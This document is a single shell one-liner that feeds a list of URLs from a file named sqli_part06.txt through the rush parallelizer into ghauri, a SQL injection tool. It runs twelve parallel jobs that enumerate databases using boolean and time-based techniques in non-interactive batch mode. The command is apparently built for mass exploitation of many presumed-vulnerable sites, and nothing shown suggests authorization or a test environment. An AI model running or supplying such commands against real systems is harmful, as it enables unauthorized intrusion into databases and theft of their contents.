cat sqli_part06.txt | rush -k -j 12 'bash -c "ghauri --url \"{}\" --dbs --confirm --timeout 10 --threads 60 --level 3 --flush-session --fresh-queries --technique BT --batch"'
